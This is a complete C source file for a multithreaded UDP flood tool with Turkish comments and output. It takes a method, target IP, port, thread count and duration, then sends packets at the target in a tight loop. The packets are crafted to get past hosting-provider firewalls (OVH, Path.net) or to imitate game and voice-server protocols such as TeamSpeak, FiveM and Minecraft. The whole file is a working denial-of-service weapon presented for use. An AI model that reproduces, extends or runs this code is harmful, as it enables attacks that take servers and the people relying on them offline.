#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <time.h>

// Yapılandırma
struct attack_params {
    char target[64];
    int port;
    int duration;
    char method[32];
};

void *attack_thread(void *arg) {
    struct attack_params *p = (struct attack_params *)arg;
    struct sockaddr_in sin;
    unsigned char payload[1500];
    int payload_len = 0;

    sin.sin_family = AF_INET;
    sin.sin_port = htons(p->port);
    sin.sin_addr.s_addr = inet_addr(p->target);

    // --- TÜM METHOD VE HEX KÜTÜPHANESİ (EKSİKSİZ) ---
    
    // 1. Hosting & Firewall Bypass Metodları
    if (strcmp(p->method, "ovh") == 0) {
        memcpy(payload, "\x01\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00", 16);
        payload_len = 16;
    } else if (strcmp(p->method, "ovh-slam") == 0) {
        memcpy(payload, "\x00\x00\x00\x00\x04\x00\x00\x00\x01\x00\x00\x00\x05\x00\x00\x00", 16);
        payload_len = 16;
    } else if (strcmp(p->method, "vox-bypass") == 0) {
        memcpy(payload, "\x00\x00\x00\x11\x09\x00\x00\x00\x00\x00\x00\x00", 12);
        payload_len = 12;
    } else if (strcmp(p->method, "tcpbl") == 0) {
        memset(payload, 0, 12); 
        payload_len = 12;
    } else if (strcmp(p->method, "tcp-rape") == 0) {
        memcpy(payload, "\x58\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x52\x45\x51\x55\x45\x53\x54", 23);
        payload_len = 23;
    } else if (strcmp(p->method, "socket") == 0) {
        memcpy(payload, "\x21\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", 16);
        payload_len = 16;
    } 
    // 2. Game & Protocol Metodları
    else if (strcmp(p->method, "path-net") == 0) {
        memcpy(payload, "\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00", 25);
        payload_len = 25;
    } else if (strcmp(p->method, "ts3-init") == 0) {
        memcpy(payload, "\x05\xca\x7f\x16\x9c\x11\xf9\xf6\x54", 9);
        payload_len = 9;
    } else if (strcmp(p->method, "ts3-vox") == 0) {
        memcpy(payload, "\x00\x00\x00\x2c\x00\x00\x00\x00\x00\x00\x00\x05\x02\x04\x0b\x02", 16);
        payload_len = 16;
    } else if (strcmp(p->method, "fivem") == 0) {
        memcpy(payload, "\xff\xff\xff\xff\x69\x00\x00\x00\x00\x00\x00\x00", 12);
        payload_len = 12;
    } else if (strcmp(p->method, "minecraft") == 0) {
        memcpy(payload, "\xfe\x01\xfa\x00\x0b\x00\x4d\x00\x43\x00\x7c\x00\x50\x00\x69\x00\x6e\x00\x67\x00\x48\x00\x6f\x00\x73\x00\x74", 27);
        payload_len = 27;
    } else if (strcmp(p->method, "discord") == 0) {
        memcpy(payload, "\x54\x53\x33\x55\x53\x52\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00", 16);
        payload_len = 16;
    } 
    // 3. Genel & High Flood Metodları
    else if (strcmp(p->method, "udpb3") == 0) {
        memset(payload, 'X', 1400); 
        payload_len = 1400;
    } else if (strcmp(p->method, "udpbypass") == 0) {
        // Rastgele boyutlu paket (Path.net gibi yerler için)
        payload_len = 64 + (rand() % 1300);
        memset(payload, rand() % 255, payload_len);
    } else {
        // Varsayılan: Standart UDP Storm
        memset(payload, rand() % 255, 1024);
        payload_len = 1024;
    }

    // Soketi aç (Döngü dışında tek seferlik, maksimum hız için)
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    
    time_t end = time(NULL) + p->duration;
    while (time(NULL) < end) {
        sendto(sock, payload, payload_len, 0, (struct sockaddr *)&sin, sizeof(sin));
    }
    
    close(sock);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc < 6) {
        printf("Kullanim: ./mermi <method> <ip> <port> <threads> <time>\n");
        return 0;
    }

    struct attack_params p;
    strncpy(p.method, argv[1], 31);
    strncpy(p.target, argv[2], 63);
    p.port = atoi(argv[3]);
    int num_threads = atoi(argv[4]);
    p.duration = atoi(argv[5]);

    pthread_t threads[num_threads];
    printf("⚔️ SUPREME HAREKAT BASLADI!\n");
    printf("🎯 Hedef: %s:%d | Metot: %s | Kol: %d\n", p.target, p.port, p.method, num_threads);

    for (int i = 0; i < num_threads; i++) {
        pthread_create(&threads[i], NULL, attack_thread, &p);
    }

    for (int i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("🏁 Operasyon tamamlandi.\n");
    return 0;
}
